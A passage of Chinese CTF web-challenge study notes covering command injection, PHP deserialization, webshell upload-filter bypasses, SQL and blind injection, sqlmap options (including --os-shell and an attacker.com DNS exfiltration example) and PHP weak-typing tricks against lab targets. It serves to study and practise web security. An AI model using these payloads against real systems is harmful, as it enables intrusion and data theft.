.codehilite .na{color:teal}
.codehilite .nb{color:#0086b3}
.codehilite .nc{color:#445588;font-weight:bold}
.codehilite .no{color:teal}
.codehilite .ni{color:purple}
.codehilite .ne{color:#990000;font-weight:bold}
.codehilite .nf{color:#990000;font-weight:bold}
.codehilite .nn{color:#555555}
.codehilite .nt{color:navy}
.codehilite .nv{color:teal}
.codehilite .ow{font-weight:bold}
.codehilite .w{color:#bbbbbb}
.codehilite .mf{color:#009999}
.codehilite .mh{color:#009999}
.codehilite .mi{color:#009999}
.codehilite .mo{color:#009999}
.codehilite .sb{color:#dd1144}
.codehilite .sc{color:#dd1144}
.codehilite .sd{color:#dd1144}
.codehilite .s2{color:#dd1144}
.codehilite .se{color:#dd1144}
.codehilite .sh{color:#dd1144}
.codehilite .si{color:#dd1144}
.codehilite .sx{color:#dd1144}
.codehilite .sr{color:#009926}
.codehilite .s1{color:#dd1144}
.codehilite .ss{color:#990073}
.codehilite .bp{color:#999999}
.codehilite .vc{color:teal}
.codehilite .vg{color:teal}
.codehilite .vi{color:teal}
.codehilite .il{color:#009999}
.codehilite .gc{color:#999;background-color:#EAF2F5}
</style><title>2019-03-23-Web</title></head><body><article class="markdown-body"><div class="toc">
<ul>
<li><a href="#_1">环境准备</a></li>
<li><a href="#_2">解题思路</a><ul>
<li><a href="#waf">过waf等过滤</a></li>
<li><a href="#flag">查找flag的命令</a></li>
</ul>
</li>
<li><a href="#webshell">上传webshell, 过验证</a></li>
<li><a href="#_3">练习</a><ul>
<li><a href="#3-php">题目3： 提交php版本号</a></li>
<li><a href="#4-admin-page-robotstxt">题目4： 找到 admin page &ndash; 熟悉robots.txt作用</a></li>
<li><a href="#5">题目5: 模拟本机登录</a></li>
<li><a href="#6">题目6: 暴破</a></li>
<li><a href="#8">题目8: 伪协议</a></li>
<li><a href="#9">题目9: 伪协议</a></li>
<li><a href="#10">题目10: 伪协议</a></li>
<li><a href="#13-sql">题目13: sql 注入</a></li>
<li><a href="#15-sql">题目15: sql 注入</a></li>
<li><a href="#php">题目： php相关</a></li>
</ul>
</li>
<li><a href="#sql">Sql 题目</a><ul>
<li><a href="#_4">工具</a><ul>
<li><a href="#sqlmap-manual">sqlmap manual</a></li>
<li><a href="#sqlmap">sqlmap</a></li>
</ul>
</li>
<li><a href="#sql_1">sql 堆叠注入</a></li>
<li><a href="#sql_2">sql 盲注</a></li>
<li><a href="#_5">常用语句</a></li>
<li><a href="#sql-md5">sql md5 加密注入</a></li>
<li><a href="#mysql-udf">扩展MySQL函数------ UDF</a></li>
<li><a href="#_6">知识点</a></li>
<li><a href="#_7">万能密码</a></li>
<li><a href="#sql_3">SQL约束攻击</a></li>
<li><a href="#_8">注入测试</a></li>
</ul>
</li>
<li><a href="#php_1">PHP 相关</a><ul>
<li><a href="#_9">基础</a><ul>
<li><a href="#-">=&gt;,-&gt;的意思</a></li>
</ul>
</li>
<li><a href="#00">%00 截断问题</a></li>
<li><a href="#serilaze">序列化 Serilaze</a></li>
<li><a href="#assert">assert 执行</a></li>
<li><a href="#phpinfo">phpinfo 审计代码反序列化</a></li>
<li><a href="#php_2">php 代码分析</a></li>
<li><a href="#phpfilter">php://filter元封装器</a></li>
<li><a href="#php_3">php 相关函数</a></li>
</ul>
</li>
<li><a href="#_10">地址猜想</a></li>
<li><a href="#mytest">mytest</a><ul>
<li><a href="#git">.git 泄漏</a></li>
<li><a href="#xxe-xml">xxe 漏洞, xml提交</a></li>
</ul>
</li>
<li><a href="#burp-suite">Burp Suite 使用</a><ul>
<li><a href="#burp-suite_1">Burp Suite</a></li>
<li><a href="#burp-suit-hackbar">Burp Suit 和 Hackbar 使用一句话木马</a></li>
<li><a href="#burp-suite_2">Burp Suite暴力破解一句话木马</a><ul>
<li><a href="#_11">图片马</a></li>
</ul>
</li>
<li><a href="#burp-suite_3">Burp Suite 破解文件上传</a></li>
<li><a href="#burp-suitesqlmap">Burp Suite配合SQLmap实现被动式注入发现</a></li>
<li><a href="#burp-suite_4">Burp Suite数据获取测试</a></li>
<li><a href="#burp-suite_5">Burp Suite目录与文件扫描测试</a></li>
</ul>
</li>
<li><a href="#todo">TODO</a></li>
</ul>
</div>
<h2 id="_1">环境准备<a class="headerlink" href="#_1" title="Permanent link"></a></h2>
<p>Firefox + 插件 proxy, hackbar</p>
<p>Chrome + 插件 proxyomega + hackbar</p>
<div class="codehilite"><pre>点击 Load URL, √Post data, 修改对应的字段
点击 Execute
</pre></div>


<p>扫描工具</p>
<div class="codehilite"><pre>wscan，ctf-wscan dirsearch之类的
</pre></div>


<h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link"></a></h2>
<ol>
<li>看源码，有什么提示。</li>
<li>查看 robots.txt, index.php, flag.php, index.php~, 当前页 php</li>
<li>如果提供了文件，可以百度下文件名， 可能有信息</li>
<li>使用 file_get_contents 获取 index.php 看源码。</li>
<li>burpsuit 查看 request 和 response, response一定也要看</li>
<li>burpsuit 抓包拦截看参数有没有 admin 或flag之类</li>
<li>F12查看源码，source, 查找关键字 password, key ,flag</li>
<li>以指定端口访问  curl web.jarvisoj.com:32770 &ndash;local-port 51</li>
<li>本地登录 bp抓包，在上方添加,  X-Forwarded-For: 127.0.0.1</li>
<li>必须来自https://<a href="http://www.google.com">www.google.com</a> &ndash; bp抓包在上方添加, Referer:<a href="https://www.google.com">https://www.google.com</a></li>
<li>以管理员登录 请求时添加 admin=1, isadmin=1</li>
<li>
<p>未使用waf过滤时,比如ping输入框 </p>
<div class="codehilite"><pre>127.0.0.1 &amp;&amp; find / -name &quot;*.txt&quot;
-c 3 -c 1 127.0.0.1 &amp;&amp; cat /home/flag.txt
</pre></div>


</li>
<li>
<p>xxe 漏洞 获取文件,比如API请求的题</p>
</li>
<li>sql md5 加密注入</li>
<li>源码泄露。扫描，可能发现些什么，index.php~</li>
</ol>
<h3 id="waf">过waf等过滤<a class="headerlink" href="#waf" title="Permanent link"></a></h3>
<ol>
<li>
<p>linux下可以添加 \ 来过, 比如 \system = system, ca\t = cat
<div class="codehilite"><pre>POST
http://d0ee41d4-e9af-43bb-99e7-e3adcf19757d.node3.buuoj.cn/index.php?func=\system&amp;p=find / -name flag*
</pre></div></p>
</li>
<li>
<p>先序列化 echo serialize($a), 然后提交反序列化的内容</p>
</li>
</ol>
<div class="codehilite"><pre><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
    <span class="k">var</span> <span class="nv">$p</span> <span class="o">=</span> <span class="s1">&#39;ls /&#39;</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s1">&#39;system&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">;</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">// O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</span>
<span class="x">// 比如func和p, 提交 func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</span>
</pre></div>

<p>方法汇编</p>
<div class="codehilite"><pre>&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;, &quot;unserialize&quot;
</pre></div>


<h3 id="flag">查找flag的命令<a class="headerlink" href="#flag" title="Permanent link"></a></h3>
<p><code>cat /*/flag; cat/*/*/flag; cat/*/*/*/flag</code></p>
<p><code>grep -r flag /</code></p>
<h2 id="webshell">上传webshell, 过验证<a class="headerlink" href="#webshell" title="Permanent link"></a></h2>
<p><strong>0x1 前端验证</strong></p>
<p>使用同名方法覆盖。或者bp发送时拦截改名。</p>
<p><strong>0x2 检查Content-type</strong></p>
<p>上传允许的类型，bp拦截,改名为webshell名。</p>
<p><strong>0x03黑名单绕过</strong></p>
<p>不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀。比如说:.phtml .phps .php5 .pht，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，需要有个前提条件，即Apache的httpd.conf有如下配置代码</p>
<div class="codehilite"><pre>AddType application/x-httpd-php .php .phtml .phps .php5 .pht .jpg
</pre></div>


<p><strong>0x04 .htaccess绕过</strong>
此处黑名单没有过滤.htaccess后缀，故此处也可上传.htaccess文件进行绕过。
注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All</p>
<p><strong>Pass-05 大小写绕过</strong></p>
<p>没有将文件名统一转成小写，故可以通过大小写绕过</p>
<p>用burp将后缀改为大写PHP即可</p>
<p><strong>Pass-06 空格绕过</strong></p>
<p>可以看到，相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过</p>
<p>Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点</p>
<p>此处会删除末尾的点，但是没有去掉末尾的空格，因此bp上传一个.php[空格]文件即可</p>
<p>修改文件后缀为1.php .这种形式，从代码执行流程分析来看，会先去除文件名末尾的.,去除之后的文件后缀是 .php[空格]，利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格和.,达到上传.php的目的。</p>
<p><strong>Pass-07 点绕过</strong></p>
<p>从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。</p>
<p>可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。故可以构造点空格点进行绕过，也就是后缀名改为xx.php. .，也是利用了Windows的特性。
也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。</p>
<p>绕过方法
将后缀名改为xx.php. .即可</p>
<p>作者：Miracle778
链接：<a href="https://www.jianshu.com/p/aabc1e7408d5">https://www.jianshu.com/p/aabc1e7408d5</a>
来源：简书
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
<h2 id="_3">练习<a class="headerlink" href="#_3" title="Permanent link"></a></h2>
<p><a href="http://192.168.100.111/web/web3/index.php#">http://192.168.100.111/web/web3/index.php#</a></p>
<h3 id="3-php">题目3： 提交php版本号<a class="headerlink" href="#3-php" title="Permanent link"></a></h3>
<div class="codehilite"><pre>1. F12， 提交请求后， 在F12-网络中 查看POST信息。找到版本。
2. 提交后仍然不对， 找源代码，比如 index.php.bak / robots.txt 或者用扫描器扫一下。
3. php中提示了使用的是Get方法提交的name=ver的值，直接发请求或者修改对应的源码
</pre></div>


<h3 id="4-admin-page-robotstxt">题目4： 找到 admin page &ndash; 熟悉robots.txt作用<a class="headerlink" href="#4-admin-page-robotstxt" title="Permanent link"></a></h3>
<div class="codehilite"><pre>1. 直接进 robots.txt --- 此文件记录相关的文件夹
2. 提示进入 login.php 得到 flag
</pre></div>


<h3 id="5">题目5: 模拟本机登录<a class="headerlink" href="#5" title="Permanent link"></a></h3>
<div class="codehilite"><pre>http://192.168.100.111/web/web5/ 
1. BurpSuite配置代理 127.0.0.1:8080, Firefox使用Proxy插件设置好代理地址。使用BP抓包，Action发送到repeater
2. 在Repteater中的raw中修改，X-Forwarded-For:127.0.0.1，点击Go
3. 提示不是管理员，修改 isadmin=1，点击Go
3. Cookie: isadmin=1
</pre></div>


<h3 id="6">题目6: 暴破<a class="headerlink" href="#6" title="Permanent link"></a></h3>
<div class="codehilite"><pre>http://192.168.100.111/web/web6/
1. 源码看到password.txt，. 拿到字典，随便发一下抓包，发现明文传输。
2 .暴破：发送到 Intuder
3. 选好字典，设置好线程，start attack
4. 得到密码后，登录，抓包，Set-Cookie: newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw; ，base64解码，得到下一页面。
islogin常用值：guest, root, admin, black,
</pre></div>


<h3 id="8">题目8: 伪协议<a class="headerlink" href="#8" title="Permanent link"></a></h3>
<div class="codehilite"><pre>http://192.168.100.111/web/web8/
看源码，需要上传文件为指定内容。
url: http://192.168.100.111/web/web8/?user=php://input
post: welcome to the Bili&#39;s world
hackbar需要有参数，使用bp抓包。
发到Repeater,然后删掉相关的参数key。只保留数据。（如果被转码了需要手动恢复。)
</pre></div>


<h3 id="9">题目9: 伪协议<a class="headerlink" href="#9" title="Permanent link"></a></h3>
<div class="codehilite"><pre>http://192.168.100.111/web/web9/
输入框中: php://filter/read=convert.base64-encode/resource=[文件路径]
输入框中: php://filter/read=convert.base64-encode/resource=index.php
</pre></div>


<h3 id="10">题目10: 伪协议<a class="headerlink" href="#10" title="Permanent link"></a></h3>
<div class="codehilite"><pre>http://192.168.100.111/web/web10/
看源码后，get提交user传入内容为文件的 welcome to the venus&#39;world 。。
1. http://192.168.100.111/web/web10/?user=data:text/plain,welcome to the venus&#39;world
2. http://lab1.xseclab.com/?^.^=data://text/plain;charset=unicode,%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29  # 放入hackkbar执行
查看源码 ,file 传入hint.php 使用filter查看内容
2. http://192.168.100.111/web/web10/?user=data:text/plain,welcome to the venus&#39;world&amp;file=php://filter/read=convert.base64-encode/resource=hint.php
3. 源码找到f1a9.php 读取文件 file=php://filter/read=convert.base64-encode/resource=f1a9.php


使用php在Flag类创建对象
$a = new Flag()
$a -&gt; file = &#39;fal9.php&#39;
echo serialize($a);

放在php环境自己执行下？
</pre></div>


<h3 id="13-sql">题目13: sql 注入<a class="headerlink" href="#13-sql" title="Permanent link"></a></h3>
<div class="codehilite"><pre>http://192.168.100.111/web/web13/
页面上有源码， 查看关键sql语句。 pw有做过滤。 user没有--从user下手。 用户名处直接注释掉
</pre></div>


<h3 id="15-sql">题目15: sql 注入<a class="headerlink" href="#15-sql" title="Permanent link"></a></h3>
<div class="codehilite"><pre>绕过 and , or
http://192.168.100.111/web/web15/?id=1
源码用了 strip_tags，通过添加&lt;&gt;标签绕过。
方法1: http://192.168.100.111/web/web15/?id=1 a&lt;&gt;nd 1=1
方法2: http://192.168.100.111/web/web15/?id=1 AND 1=1 , 大小写未过滤
</pre></div>


<h3 id="php">题目： php相关<a class="headerlink" href="#php" title="Permanent link"></a></h3>
<div class="codehilite"><pre>php中的弱类型比较：字符和数字比较时 字符当作0处理
5.x版本中 (int)3.1e10 会省略为3 ， 
7.x版本中是 3100000000
</pre></div>


<p>0， null, !== false, ==false     &mdash;  !==不全等</p>
<p>验证码相关</p>
<div class="codehilite"><pre>1. 有的能直接使用上次的验证码暴破
2. 有时验证码为空也可发送

验证码发布的流程
1. 显示表单
2. 显示验证码（调用生成验证码的程序），将验证码加密后放进 session 或者 cookie
3. 用户提交表单
4. 核对验证码无误、数据合法后写入数据库完成
用户如果再发布一条，正常情况下，会再次访问表单页面，验证码图片被动更新， session 和 cookie 也就跟着变了
但是灌水机操作不一定非要使用表单页面，它可以直接模拟 post 向服务端程序发送数据，这样验证码程序没有被调用，当然 session 和 cookie 存储的加密验证码就是上次的值，也就没有更新，这样以后无限次的通过post直接发送的数据，而不考虑验证码，验证码形同虚设！
所以，在核对验证码后先将 session 和 cookie 的值清空，然后做数据合法性判断，然后入库！这样，一个漏洞就被补上了！
</pre></div>


<h2 id="sql">Sql 题目<a class="headerlink" href="#sql" title="Permanent link"></a></h2>
<h3 id="_4">工具<a class="headerlink" href="#_4" title="Permanent link"></a></h3>
<p>sqlmap</p>
<h4 id="sqlmap-manual">sqlmap manual<a class="headerlink" href="#sqlmap-manual" title="Permanent link"></a></h4>
<p>将请求保存成3.txt</p>
<p>sqlmap  -r 3.txt &ndash;technique T &ndash;level 3 &ndash;tamper=space2comment</p>
<p>sqlmap  -r 3.txt &ndash;technique T &ndash;level 3 &ndash;tamper=space2comment -D injection -T admin &ndash;dump</p>
<p>&ndash;technique</p>
<p>指定sqlmap使用的检测技术，默认情况下会测试所有的方式。</p>
<p>Boolean-based blind</p>
<p>Error-based</p>
<p>Union query-based</p>
<p>Stacked queries(对文件系统、操作系统、注册表操作时，必须指定该方式)</p>
<p>Time-based blind</p>
<p>&ndash;time-sec</p>
<p>设置延迟时间，基于时间的注入检测默认延迟时间是5秒</p>
<p>&ndash;union-cols</p>
<p>联合查询时默认是1-10列，当level=5时会增加到测试50个字段数，可以使用此参数设置查询的字段数。</p>
<p>&ndash;union-char</p>
<p>默认情况下sqlmap针对UNION查询的注入会使用NULL字符；</p>
<p>有些情况下使用NULL字符会造成页面返回失败，而使用一个随机整数是成功的，可以使用&ndash;union-char指定UNION查询的字符。</p>
<p>&ndash;dns-domain</p>
<p>攻击者控制了某DNS服务器，使用此功能可以提高数据查询的速度</p>
<p>例如：&ndash;dns-domain=&rdquo;attacker.com&rdquo;</p>
<p>&ndash;second-order</p>
<p>有些时候注入点输入的数据，返回的结果并不是当前页面，而是另外一个页面。</p>
<p>使用此参数指定到哪个页面获取响应判断真假，&ndash;second-order后面跟一个判断页面的URL地址。例如：</p>
<p>&ndash;second-order=&rdquo;<a href="http://1.1.1.1/a.php">http://1.1.1.1/a.php</a>&ldquo;</p>
<p><a href="https://blog.csdn.net/Litbai_zhang/article/details/99681398">SQLMap中tamper的简介</a></p>
<h4 id="sqlmap">sqlmap<a class="headerlink" href="#sqlmap" title="Permanent link"></a></h4>
<p>sqlmap -u &ldquo;http://xxx&rdquo; &ndash;batch</p>
<div class="codehilite"><pre>之后写入同样的命令加参数
-u URL
--current-user
--current-db
--dump
--os-shell
-D tourdata --tables # 所有表
-D tourdata -T userb --columns # 表字段
sqlmap.py -r Filename.txt --dbs --level=3
sqlmap -u http://x.x/show.php?id=35 --level=3 -D test --tables -C thekey --dump
</pre></div>


<p>使用http请求文件</p>
<div class="codehilite"><pre>可以用burpsuite抓包并复制到txt文件（注意请用gedit编辑器，vim会因为格式问题报错）
sqlmap -r 1.txt
2.使用burpsuite log文件 （勾选上options中的Misc中的proxy）
sqlmap -l log.txt
</pre></div>


<h3 id="sql_1">sql 堆叠注入<a class="headerlink" href="#sql_1" title="Permanent link"></a></h3>
<div class="codehilite"><pre>&#39;or 1=1#             //
1&#39;order by 2#         //只有2字段。
1&#39;union select 1,2#         //返回一个正则过滤 return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);
想到堆叠注入，试一下，
1&#39;;show tables;#            // 有我们要的字段

    array(1) {
      [0]=&gt;
      string(16) &quot;1919810931114514&quot;
    }
0&#39;; show columns from words ;#
</pre></div>


<h3 id="sql_2">sql 盲注<a class="headerlink" href="#sql_2" title="Permanent link"></a></h3>
<p><strong>知识点</strong></p>
<p>页面只返回True（密码错误）或False（用户名错误），考察SQL盲注。</p>
<p>解题步骤 <a href="http://web.jarvisoj.com:32787/login.php">http://web.jarvisoj.com:32787/login.php</a></p>
<div class="codehilite"><pre>admin                       //尝试admin提示密码错误，其他用户名均提示用户名错误
&#39;or 1=1#                    //提示用户名错误，过滤了空格或or
&#39;or/**/1=1#                 //提示密码错误，确定过滤了空格
&#39;or/**/ascii(substr(database(),1,1))&gt;1#     //提示密码错误，可以开始爆破了

使用username=admin’#&amp;password=123456,页面返回密码错误，说明后台没有对#和’进行过滤。
使用username=admin’ or 1=1#&amp;password=123456，页面返回用户名错误，上面后台对admin’ or 1=1#中的部分内容进行了过滤。过滤的内容有可能是or也有可能是空格。
使用username=user’//or//1=1#&amp;password=123456，页面返回密码错误，说明输入的SQL语句能够被执行，这也表明后台仅仅是过滤了空格。
总结，username存在sql注入，同时仅仅只是过滤了空格，那么就是一个盲注了

整个PoC就是一个基于错误的盲注的步骤了，具体的方法可以参考文章。

查找表，username=user’//or//exists(select////from/*/admin)#&amp;password=123456,页面返回密码错误，那么就说明在数据库中存在admin表
查找字段username=user’//or//exists(select//username,password//from/**/admin)#&amp;password=123456，页面返回密码错误，说明在admin表中存在username和password字段。
username=user’//or//exists(select//count()//from/*/admin)#&amp;password=123456，页面返回密码错误，说明在admin表中仅仅只存在一条记录，接下来就好办了
得到password长度，username=user’//or//(select//length(password)//from/**/admin)&gt;10#&amp;password=123456，通过二分试探法，最终发现password的字段长度是32位，说明可能采用的是md5的方式来进行加密的。
在确定了password的长度之后，接下来就是利用Python来进行爆破了。

username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=123456
</pre></div>


<p>方法2, 
username=any&rsquo;/<strong>/union/</strong>/select/**/&rsquo;c4ca4238a0b923820dcc509a6f75849b&rsquo;#&amp;password=1</p>
<div class="codehilite"><pre># c4ca4238a0b923820dcc509a6f75849b 是 1 的md5 (password=1所以用1)
# username 随意写
</pre></div>


<h3 id="_5">常用语句<a class="headerlink" href="#_5" title="Permanent link"></a></h3>
<p>where id = 1 and 1=1</p>
<p>where id = 1 and 1=2</p>
<p>1有结果，2没结果，上面两句确定数据库是否执行。</p>
<p>select * from user where id = 1 and 1=1 union select flag from flag, union需要前后列一样。</p>
<p>使用orderby 看几次没结果确定列数。</p>
<div class="codehilite"><pre>union select 1,2,3          ---是列数
http://192.168.100.111/web/web15/?id=1 Order by 3  , 确定了是3列。
http://192.168.100.111/web/web15/?id=1 Order by 4  , 没有结果。

前面没结果时显示后面的结果。用-1 或者 and 1=2
http://192.168.100.111/web/web15/?id=-1 Union Select 1,2,3
http://192.168.100.111/web/web15/?id=-1 Union Select database(),2,3     --查询库名
http://192.168.100.111/web/web15/?id=-1 Union Select database(),user(),3     --查询用户名
http://192.168.100.111/web/web15/?id=-1 Union Select database(),user(),version()     --查询数据库版本
http://192.168.100.111/web/web15/?id=-1 Union Select database(),user(),version()     --查询数据库版本
INFORMATION_SCHEMA 数据库保存 库，表的信息。
  SCHEMATA 库名
  TABLES  有两列，一列所有库，二列所有库的所有表。
  COLUMNS 全部库的表的列

--有问题 http://192.168.100.111/web/web15/?id=-1 Union Select TABLE_NAME,2,3 where table_schema = database()     --查询数据库表名
--有问题 http://192.168.100.111/web/web15/?id=-1 UNION SELECT TABLE_NAME,2,3 FROM INFORMATION_SCHEMA WHERE TABLE_SCHEMA = DATABASE()
</pre></div>


<h3 id="sql-md5">sql md5 加密注入<a class="headerlink" href="#sql-md5" title="Permanent link"></a></h3>
<p>方法1 </p>
<p>ffifdyop 撞</p>
<p><code>抓包的 Response Hint: "select * from</code>admin<code>where password='".md5($pass,true)."'"</code></p>
<ul>
<li>
<p>PS：为什么要输入ffifdyop呢？</p>
</li>
<li>
<p>根据此题中的password的语句：<code>select * form admin where password=''</code>
进行password的绕过，需将此语句填充为：<code>select * form admin where password=''or 1</code>，又因为此题有md5加密，并转换为字符串，所以根据前人，大师傅们的总结，有：</p>
<p>字符串：<code>ffifdyop</code></p>
<p>md5加密后：<code>276f722736c95d99e921722cf9ed621c</code></p>
<p>转换为字符串：<code>'or'6&lt;乱码&gt;</code>
那么，拼接后的语句为：<code>select * from admin where password=''or'6&lt;乱码&gt;'</code>，就相当于 <code>select * from admin where password=''or 1</code> ,实现sql注入。</p>
</li>
</ul>
<hr />
<p>方法2</p>
<p>Google 了一下 <code>sql injection php md5</code>，发现了有趣的东西，下面就放一个串就好。</p>
<div class="codehilite"><pre>password: 129581926211651571912466741651878684928

raw: ?T0D??o#??&#39;or&#39;8.N=?
</pre></div>


<h3 id="mysql-udf">扩展MySQL函数------ UDF<a class="headerlink" href="#mysql-udf" title="Permanent link"></a></h3>
<p>udf是mysql自定义函数包，</p>
<p>udf.so用于linux系统，udf.dll用于windows系统。</p>
<p>有时候我们需要对表中的数据进行一些处理而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，使用者自行添加的MySQL函数就称为UDF(User Define Function)。</p>
<p>做法就是</p>
<div class="codehilite"><pre>$ mysql
&gt; select @@plugin_dir;
</pre></div>


<p>得到插件的目录，将 udf.so 拷贝过去，然后再</p>
<div class="codehilite"><pre>$ mysql
&gt; create function getflag returns string soname &#39;udf.so&#39;;
&gt; select help_me();
&gt; select getflag();
</pre></div>


<h3 id="_6">知识点<a class="headerlink" href="#_6" title="Permanent link"></a></h3>
<p>反引号可可以注入``</p>
<h3 id="_7">万能密码<a class="headerlink" href="#_7" title="Permanent link"></a></h3>
<p>select * from user where uname = &lsquo;222&rsquo; and upass = &lsquo;222&rsquo; 
select * from user where uname = &lsquo;222&rsquo; and upass = &lsquo;222&rsquo; or 1=1
select * from user where uname = &lsquo;222&rsquo; and upass = &lsquo;222&rsquo; or &lsquo;1=1#&rsquo;
select * from user where uname = &lsquo;222&rsquo; and upass = &lsquo;222&rsquo; or &lsquo;1&rsquo;=&lsquo;1&rsquo;</p>
<h3 id="sql_3">SQL约束攻击<a class="headerlink" href="#sql_3" title="Permanent link"></a></h3>
<p>字符串末尾的空格符将会被删除。换句话说&rdquo;vampire&rdquo;等同于&rdquo;vampire &ldquo;，构造&rdquo;admin   &ldquo;作为admin登录</p>
<h3 id="_8">注入测试<a class="headerlink" href="#_8" title="Permanent link"></a></h3>
<p>%20就是空格</p>
<p>测试</p>
<div class="codehilite"><pre>http://web.jarvisoj.com:32794/index.php?table=test` `union select 1 limit 1,1
</pre></div>


<p>数据库名</p>
<div class="codehilite"><pre>http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1
</pre></div>


<p>表名</p>
<div class="codehilite"><pre>http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1
# 得到所有表名 secret_flag,secret_test
</pre></div>


<p>列名</p>
<div class="codehilite"><pre>http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1
</pre></div>


<p>flag</p>
<div class="codehilite"><pre>http://web.jarvisoj.com:32794/index.php?table=test` `union select flagUwillNeverKnow from secret_flag limit 1,1
</pre></div>


<h2 id="php_1">PHP 相关<a class="headerlink" href="#php_1" title="Permanent link"></a></h2>
<h3 id="_9">基础<a class="headerlink" href="#_9" title="Permanent link"></a></h3>
<ol>
<li>
<p>弱类型比较</p>
<div class="codehilite"><pre>旧版本的　PHP,  &quot;1b&quot; == 1 -&gt; true，弱类型字符串直接会转数字，去掉后面的b
== 非严格比较， 先类型转换再比较
=== 会进行类型比较 &quot;1b&quot; === 1 -&gt; false

同时满足 $a==0 和 $a  ------  a=abc

同时 !is_numeric($b) 和 $b&gt;1234 ------ b=1234a

2. 值不一样结果要一样, md5 hash缺陷 0e开头弱类型
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469
v1[]=aaa&amp;v2[]=bbb&amp;v3=[]=1
</pre></div>


</li>
<li>
<p>空数组</p>
<div class="codehilite"><pre>var dump(strcmp(&quot;aaa&quot;,&quot;flag&quot;));  --&gt;-1
var dump(strcmp(&quot;flag&quot;,&quot;flag&quot;)); --&gt;0
var_dump(strcmp(array(&quot;aaa&quot;),&quot;flag&quot;))
v1=s878926199a&amp;v2=s155964671a&amp;v3=[]=1
v1[]=aaa&amp;v2[]=bbb&amp;v3=[]=1
</pre></div>


</li>
<li>
<p>sha1加密相同 -传空数组</p>
<p>遇数组返回 null</p>
<p>v1[]=aaa&amp;v2[]=bbb</p>
<div class="codehilite"><pre>1.字符串与整数比较时会进行类型转换
2.MD5 0e开头的哈希值
3.MD5函数传入数组返回结果为NULL
4.SHA1哈希函数传入数组返回结果为NULL
5.strcmp函数传入数组返回结果为NULL
</pre></div>


</li>
</ol>
<h4 id="-">=&gt;,-&gt;的意思<a class="headerlink" href="#-" title="Permanent link"></a></h4>
<p>-&gt;是对象执行方法或取得属性用的。</p>
<p>=&gt;是数组里键和值对应用的。</p>
<ul>
<li>
<p>=&gt; 的用法
数组中用copy于数组的 key 和 value之间的关系</p>
<div class="codehilite"><pre>$a = array(&#39;0&#39; =&gt; &#39;1&#39;, &#39;2&#39; =&gt; &#39;4&#39;, );
echo $a[&#39;0&#39;];
echo $a[&#39;2&#39;];
</pre></div>


</li>
<li>
<p>-&gt; 的用法</p>
</li>
</ul>
<p>类中用于引用类实例的方法和属性</p>
<div class="codehilite"><pre>class Test{
    function add(){return $this-&gt;var++;}
    var $var = 0;
}
$a = new Test; //实例化对象名称
echo $a-&gt;add();
echo $a-&gt;var;
</pre></div>


<h3 id="00">%00 截断问题<a class="headerlink" href="#00" title="Permanent link"></a></h3>
<p><a href="http://web.jarvisoj.com:32785/">http://web.jarvisoj.com:32785/</a></p>
<p>?page=xxxx</p>
<p>?page=xxxx%00 就可以截断</p>
